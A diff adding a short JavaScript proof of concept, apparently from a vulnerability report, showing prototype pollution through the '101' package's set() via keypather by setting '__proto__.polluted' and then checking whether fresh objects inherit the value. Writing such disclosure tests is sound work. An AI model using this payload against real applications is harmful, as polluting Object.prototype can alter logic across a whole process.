@@ -1,0 +1,26 @@
+```javascript
+// Prototype Pollution via 101's set() -> keypather's set()
+// keypather does not sanitize "__proto__" segments in dotted keypaths,
+// so an attacker-controlled key (e.g. from user input merged into an object)
+// can pollute Object.prototype for the entire process.
+
+const set = require("101/set");
+
+// Attacker-controlled keypath and value reaching set()
+const attackerKey = "__proto__.polluted";
+const attackerVal = "yes";
+
+const obj = {}; // any plain object the app builds from user input
+set(obj, attackerKey, attackerVal);
+
+// Every other object in the process is now polluted
+const victim = {};
+console.log("victim.polluted =>", victim.polluted); // "yes"
+console.log("Object.prototype.polluted =>", Object.prototype.polluted); // "yes"
+
+if (victim.polluted === attackerVal) {
+  console.log("VULNERABLE: prototype pollution confirmed");
+} else {
+  console.log("not vulnerable");
+}
+```
